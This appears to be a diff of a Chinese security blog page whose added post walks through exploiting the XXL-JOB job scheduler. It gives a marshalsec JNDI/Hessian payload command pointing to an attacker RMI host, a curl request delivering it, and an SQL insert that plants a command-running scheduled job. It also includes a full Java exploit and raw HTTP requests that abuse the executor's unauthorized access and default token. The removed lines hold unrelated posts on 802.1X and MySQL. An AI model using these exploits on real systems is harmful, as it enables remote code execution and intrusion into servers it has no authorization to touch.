+<h3><span id="2-反弹shell">2、反弹shell</span></h3><blockquote>
+<p>在实战中会碰到executor不出网的情况。即执行了反弹shell的命令之后在vps上未收到回显，这时就要去思考executor是否出网或者是注册executor是否失效。<br>我们可以去执行器中查看其注册方式</p>
+<p><img src="/2025/11/24/XXL-JOB/6.png" alt="image"></p>
+<p>我们去正常来说自动注册的executor是不会出问题的。因为从代码实现来看xxl-job的executor每隔2min就会向adminer发送心跳证明其存活。而自己注册的可能就不一定可以打通。</p>
+</blockquote>
+<h2><span id="二-api未授权访问">二、api未授权访问</span></h2><blockquote>
+<p>在xxl-job&lt;&#x3D;2.0.2的时候api存在未授权访问，有两种方式可以getshell。</p>
+</blockquote>
+<h3><span id="1-利用jndi注入去打内存马">1、利用jndi注入去打内存马</span></h3><blockquote>
+<p>这个已经被人讲过好多次了，但是利用的前提就是需要出网，使用marshalsec去生成payload</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/aaa &gt; test.ser</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>再利用curl去发包即可，注意尽量使用linux或者Windows的cmd去发包，实测Windows下powershell发包可能会出现一些问题。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST -H <span class="string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @test.ser http://127.0.0.1:8080/xxl-job-admin/api</span><br></pre></td></tr></table></figure>
+
+<h3><span id="2-去利用xslt去注入内存马">2、去利用XSLT去注入内存马</span></h3><blockquote>
+<p>这个应该是最好使的方案，Nookipop已经讲过了，在不出网时可以利用XSLT去打入内存马，进行命令执行，打入suo5内存马进行正向代理内网穿透。</p>
+<p>详见 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2592">记一次曲折的XXL-JOB API Hessian反序列化到Getshell</a></p>
+</blockquote>
+<h2><span id="三-执行命令注入内存马">三、执行命令注入内存马</span></h2><blockquote>
+<p>这种同样是不出网时才考虑的操作。注入的是agent内存马，这个利用的条件其实也有点苛刻，一般来说xxl-job的executor常常跑在docker环境下或者分布式部署。而要想注入agent类型的内存马就需要admin端和executor跑在一台主机下。方法就是使用echo方法或者java的写入文件的方法将agent内存马写到目标主机上，然后在进行加载。具体利用方法可参照。<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8KZzBEX36noXBGFlWa1UQQ">XXL-JOB 深度利用</a></p>
+</blockquote>
+<h2><span id="四-奇技淫巧-从数据库getshell">四、奇技淫巧-从数据库getShell</span></h2><blockquote>
+<p>这也是实战中遇到的一个案例，目标单位存在一个nacos的身份伪造漏洞，获取到了数据库的配置文件，成功的连上了数据库，当然我们可以去尝试udf提权或者猜目录去写马，但我发现数据库中存在xxl_job的数据库，这时候其实就有更多的方法去getshell。</p>
+<p><img src="/2025/11/24/XXL-JOB/7.png" alt="image"></p>
+<p><img src="/2025/11/24/XXL-JOB/8.png" alt="image"></p>
+<p>这时候通常有两种利用方式:1、获取到xxl-job的密码，登入xxl-job去写计划任务进行命令执行getshell。2、直接通过往数据库里写内容进行getshell。</p>
+</blockquote>
+<h3><span id="1-登入xxl-job进行getshell">1、登入xxl-job进行getshell</span></h3><blockquote>
+<p>这种方式通常适用于xxl-job-admin的服务暴露在互联网上。我们可以通过语句<code>select * from information_schema.PROCESSLIST;</code>来判断客户端连接。由于我是在本地跑的环境，这里就是localhost，如果是通过公网ip去连接的数据库，我们就可以定位到其公网ip，扫一下端口即可判断xxl-job-admin是否暴露在公网上了。</p>
+<p><img src="/2025/11/24/XXL-JOB/9.png" alt="image"></p>
+<p>如果暴露在公网上，我们便可以直接利用，xxl-job密码为md5加密，我们首先可以尝试md5解密，解不开的话新增一个用户，密码用md5加密即可。登入成功之后我们便可以通过计划任务进行命令执行了。</p>
+<p><img src="/2025/11/24/XXL-JOB/10.png" alt="image"></p>
+</blockquote>
+<h3><span id="2-通过向数据库中写入数据进行getshell">2、通过向数据库中写入数据进行getshell</span></h3><blockquote>
+<p>这是我偶然发现的一个小trick，其实原理很简单，xxl-job-admin会定时从数据库中查询待执行的任务，在一定时间内执行。也就是说，我们只需要往数据库里插入我们构造好的恶意定时任务。他便会让executor去执行。当前测试版本为2.4.1（不同版本的xxl-job的数据库结构不太相同，以最新版的为例，旧版的在之前遇到的环境中经测试也能打通。）</p>
+<p>只需要在xxl_job.xxl_job_info中插入这条语句即可</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `xxl_job`.`xxl_job_info` </span><br><span class="line">(`id`, `job_group`, `job_desc`, `add_time`, `update_time`, `author`, `alarm_email`, `schedule_type`, `schedule_conf`, `misfire_strategy`, `executor_route_strategy`, `executor_handler`, `executor_param`, `executor_block_strategy`, `executor_timeout`, `executor_fail_retry_count`, `glue_type`, `glue_source`, `glue_remark`, `glue_updatetime`, `child_jobid`, `trigger_status`, `trigger_last_time`, `trigger_next_time`) </span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">7</span>, <span class="number">1</span>, <span class="string">&#x27;22222&#x27;</span>, <span class="string">&#x27;2023-12-27 14:57:36&#x27;</span>, <span class="string">&#x27;2023-12-27 14:58:23&#x27;</span>, <span class="string">&#x27;22222&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;CRON&#x27;</span>, <span class="string">&#x27;0/5 * * * * ?&#x27;</span>, <span class="string">&#x27;DO_NOTHING&#x27;</span>, <span class="string">&#x27;FIRST&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;SERIAL_EXECUTION&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;GLUE_POWERSHELL&#x27;</span>, <span class="string">&#x27;calc\n&#x27;</span>, <span class="string">&#x27;12312321&#x27;</span>, <span class="string">&#x27;2023-12-27 14:57:48&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="number">1703660320000</span>, <span class="number">1703660325000</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中有几个值得关注的点：</p>
+<p><code>schedule_type</code>为<code>corn</code>轮询，<code>0/5 * * * * ?</code>则是计划任务执行的时间我这里设定为5秒1次。<code>executor_handler</code>则是执行命令的类型，我这里因为在Windows下测试，故而选择为powershell，也可变为<code>GLUE_SHELL</code>或者<code>GLUE_GROOVY</code>等来应对不同的命令。目前我们只是插入了命令，并不能执行，要是想执行，还需要在插入数据之后把<code>trigger_status</code>的值改为1，executor便会自动开始执行我们输入的命令。</p>
+</blockquote>
+<h2><span id="五-executor未授权访问">五、executor未授权访问</span></h2><blockquote>
+<p>xxl-job的executeor存在未授权访问漏洞，指纹如下图所示</p>
+<p>低版本</p>
+<p><img src="/2025/11/24/XXL-JOB/11.png" alt="image"></p>
+<p>高版本</p>
+<p><img src="/2025/11/24/XXL-JOB/12.png" alt="image"></p>
+<p>其原因就是admin端与executeor端通过互相发送tcp包进行通信，攻击者可伪造包，使executeor执行命令。</p>
+<p>该漏洞主要分为三个阶段</p>
+</blockquote>
+<h3><span id="1-xxljoblt212需要利用hessian触发">1、XxlJob&lt;2.1.2，需要利用Hessian触发</span></h3><blockquote>
+<p>参考这个项目即可RCE<br><a target="_blank" rel="noopener" href="https://github.com/OneSourceCat/XxlJob-Hessian-RCE">https://github.com/OneSourceCat/XxlJob-Hessian-RCE</a></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.TriggerParam;</span><br><span class="line"><span class="keyword">import</span> com.xxl.rpc.remoting.net.params.XxlRpcRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.rpc.serialize.impl.HessianSerializer;</span><br><span class="line"><span class="keyword">import</span> org.asynchttpclient.AsyncCompletionHandler;</span><br><span class="line"><span class="keyword">import</span> org.asynchttpclient.AsyncHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.asynchttpclient.DefaultAsyncHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.asynchttpclient.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendData</span><span class="params">(String url, <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">AsyncHttpClient</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAsyncHttpClient</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            c.preparePost(url)</span><br><span class="line">            .setBody(bytes)</span><br><span class="line">            .execute(<span class="keyword">new</span> <span class="title class_">AsyncCompletionHandler</span>&lt;Response&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> Response <span class="title function_">onCompleted</span><span class="params">(Response response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Server Return Data: &quot;</span>);</span><br><span class="line">                    System.out.println(response.getResponseBody());</span><br><span class="line">                    <span class="keyword">return</span> response;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onThrowable</span><span class="params">(Throwable t)</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;HTTP出现异常&quot;</span>);</span><br><span class="line">                    t.printStackTrace();</span><br><span class="line">                    <span class="built_in">super</span>.onThrowable(t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).toCompletableFuture().join();</span><br><span class="line"></span><br><span class="line">            c.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;package com.xxl.job.service.handler;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;import com.xxl.job.core.log.XxlJobLogger;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;import com.xxl.job.core.biz.model.ReturnT;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;import com.xxl.job.core.handler.IJobHandler;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;import java.lang.Runtime;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;public class DemoGlueJobHandler extends IJobHandler &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\t@Override\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\tpublic ReturnT&lt;String&gt; execute(String param) throws Exception &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \tRuntime.getRuntime().exec(\&quot;calc\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\t\treturn ReturnT.SUCCESS;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">TriggerParam</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TriggerParam</span>();</span><br><span class="line">        params.setJobId(<span class="number">10</span>);</span><br><span class="line">        params.setExecutorBlockStrategy(<span class="string">&quot;SERIAL_EXECUTION&quot;</span>);</span><br><span class="line">        params.setLogId(<span class="number">10</span>);</span><br><span class="line">        params.setLogDateTime((<span class="keyword">new</span> <span class="title class_">Date</span>()).getTime());</span><br><span class="line">        params.setGlueType(<span class="string">&quot;GLUE_GROOVY&quot;</span>);</span><br><span class="line">        params.setGlueSource(code);</span><br><span class="line">        params.setGlueUpdatetime((<span class="keyword">new</span> <span class="title class_">Date</span>()).getTime());</span><br><span class="line"></span><br><span class="line">        <span class="type">XxlRpcRequest</span> <span class="variable">xxlRpcRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XxlRpcRequest</span>();</span><br><span class="line">        xxlRpcRequest.setRequestId(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        xxlRpcRequest.setClassName(<span class="string">&quot;com.xxl.job.core.biz.ExecutorBiz&quot;</span>);</span><br><span class="line">        xxlRpcRequest.setMethodName(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">        xxlRpcRequest.setParameterTypes(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TriggerParam.class&#125;);</span><br><span class="line">        xxlRpcRequest.setParameters(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;params&#125;);</span><br><span class="line">        xxlRpcRequest.setCreateMillisTime((<span class="keyword">new</span> <span class="title class_">Date</span>()).getTime());</span><br><span class="line"></span><br><span class="line">        <span class="type">HessianSerializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianSerializer</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = serializer.serialize(xxlRpcRequest);</span><br><span class="line">        sendData(<span class="string">&quot;http://127.0.0.1:9999&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="2-220ltx3dxxljobltx3d240">2、2.2.0&lt;&#x3D;XxlJob&lt;&#x3D;2.4.0</span></h3><blockquote>
+<p>支持了RESTFUL API，可以直接发送http包伪造<br>exp</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/run</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.226.1:10999</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">XXL-JOB-ACCESS-TOKEN</span><span class="punctuation">: </span>default_token</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;jobId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorHandler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorParams&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorBlockStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COVER_EARLY&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;logId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;logDateTime&quot;</span><span class="punctuation">:</span> <span class="number">1586629003729</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GLUE_POWERSHELL&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueUpdatetime&quot;</span><span class="punctuation">:</span> <span class="number">1586699003758</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;broadcastIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;broadcastTotal&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="3-xxljob-gtx3d-240添加了默认token">3、XxlJob &gt;&#x3D; 2.4.0添加了默认token</span></h3><blockquote>
+<p>作者为了修复该漏洞，添加了默认的token，但是这就如同nacos的jwt秘钥，shiro的默认key一样，由于使用者的粗心大意不修改该key，还是可以被利用<br>exp</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/run</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.226.1:10999</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">XXL-JOB-ACCESS-TOKEN</span><span class="punctuation">: </span>default_token</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;jobId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorHandler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorParams&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demoJobHandler&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorBlockStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COVER_EARLY&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;executorTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;logId&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;logDateTime&quot;</span><span class="punctuation">:</span> <span class="number">1586629003729</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GLUE_POWERSHELL&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;glueUpdatetime&quot;</span><span class="punctuation">:</span> <span class="number">1586699003758</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;broadcastIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;broadcastTotal&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/11/21/Apk-Medit/">
                 如何使用Apk-Medit对APK进行内存搜索和数据修改
             </a>
@@ -1260,153 +1614,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/11/13/Windows-802.1x/">
-                WIN10系统使用自带软件进行有线802.1X认证时的配置方法
-            </a>
-        </h2>
-    
-    <time>
-        Nov 13, 2025
-    </time>
-    <section class="content">
-        <h1><span id="win10系统使用自带软件进行有线8021x认证时的配置方法">WIN10系统使用自带软件进行有线802.1X认证时的配置方法</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/cn/zh/thread/blog/580922949744082944?blogId=580922949744082944">丁晏</a> 并作补充</p>
-</blockquote>
-<h2><span id="前提条件">前提条件</span></h2><blockquote>
-<p>选择“开始 &gt; 控制面板”，依次单击“系统和安全”、“管理工具”和“服务”，确认“Extensible Authentication Protocol”和“Wired AutoConfig”两个服务的“启动类型”为“自动”，“状态”为“正在运行”。</p>
-</blockquote>
-<h2><span id="操作步骤">操作步骤</span></h2><blockquote>
-<p>1、选择“开始 &gt; 控制面板”。<br>2、在“控制面板”选择“网络和Internet &gt; 网络和共享中心 &gt; 查看网络状态和任务 &gt; 以太网”（控制面板的“查看方式”选择“类别”时可显示“网络和Internet”）。</p>
-<p><img src="/2025/11/13/Windows-802.1x/1.png" alt="image"></p>
-<p>3、在“以太网状态”窗口，选择“属性”。<br>4、在“身份验证”页签，选中“启用IEEE 802.1X身份验证”，“选择网络身份验证方法”设置为“Microsoft: 受保护的EAP（PEAP）”，单击“设置”。</p>
-<p><img src="/2025/11/13/Windows-802.1x/2.png" alt="image"></p>
-<p>5、取消勾选“通过验证证书来验证服务器的身份”，“选择身份验证方法”选择“安全密码（EAP-MSCHAP v2）”，单击“配置”。</p>
-<p><img src="/2025/11/13/Windows-802.1x/3.png" alt="image"></p>
-<p>6、取消选中“自动使用 Windows 登录名和密码”，单击“确定”。</p>
-<p><img src="/2025/11/13/Windows-802.1x/4.png" alt="image"></p>
-<p>说明：如果操作系统使用AD域帐号登录，并且用来进行802.1X认证的用户名和密码也是使用的登录操作系统的域帐号和密码，则勾选“自动使用Windows登录名和密码”。</p>
-<p>7、等待Windows弹出认证框，即可输入用户名和密码进行认证。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/11/12/MYSQL-Field-Overflow/">
-                MySQL数据库字段超长问题
-            </a>
-        </h2>
-    
-    <time>
-        Nov 12, 2025
-    </time>
-    <section class="content">
-        <h1><span id="mysql数据库字段超长问题">MySQL数据库字段超长问题</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://blog.csdn.net/a82514921/article/details/126073366">adrninistrat0r</a> 并作补充</p>
-</blockquote>
-<h2><span id="1-存在的问题">1. 存在的问题</span></h2><blockquote>
-<p>在向MySQL数据库表中插入或更新记录时，有时会出现字段超长的问题，包括但不限于以下场景：</p>
-<p>处理上游系统发送的交易信息，将多个字段拼成一个JSON或其他格式的字符串；在增加字段，或数据较长时，写入或更新数据库时可能超长；</p>
-<p>调用下游系统的服务，返回的部分字段（如错误信息等）较长时，导致更新数据库记录失败。</p>
-</blockquote>
-<h2><span id="2-问题解决与优化建议">2. 问题解决与优化建议</span></h2><h3><span id="21-json等格式的字段">2.1. JSON等格式的字段</span></h3><blockquote>
-<p>有业务含义的重要字段，不建议通过JSON字符串格式保存在一个数据库字段中。</p>
